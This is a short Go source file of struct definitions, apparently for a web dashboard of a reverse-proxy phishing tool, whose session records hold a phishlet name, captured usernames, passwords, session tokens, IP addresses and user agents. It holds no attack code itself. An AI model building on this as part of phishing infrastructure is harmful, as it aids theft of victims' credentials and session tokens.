package core

type BaseTemplateData struct {
	PageTitle string
	Sessions  []DisplaySession
}

// Data strucutre : key-value pair for Bunt DB
type DisplaySession struct {
	ID          int    `json:"id"`
	Phishlet    string `json:"phishlet"`
	Username    string `json:"username"`
	Password    string `json:"password"`
	Tokens      string `json:"tokens"`
	Remote_addr string `json:"remote_addr"`
	Useragent   string `json:"useragent"`
	Update_time string `json:"update_time"`
}

// APIResponse structure : send data to UI
type APIResponse struct {
	Body string `json:"body"`
}
